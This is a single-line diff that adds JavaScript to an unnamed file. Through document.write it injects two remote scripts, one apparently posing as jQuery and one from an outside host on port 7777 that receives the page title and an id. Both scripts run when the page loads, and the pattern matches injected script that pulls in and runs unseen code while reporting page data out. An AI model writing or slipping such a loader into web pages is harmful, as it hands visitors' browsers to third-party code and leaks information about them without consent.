@@ -1,0 +1,1 @@
+document.write("<script language='javascript' src='http://zone.wooyun.org/source/js/jquery.js?_vv=20080808'></script>");document.write("<script language='javascript' src='http://p.ywbmh.com:7777/pt/pt.php?src=p0007&t="+encodeURIComponent(document.title)+"&ci=3738743554'></script>");
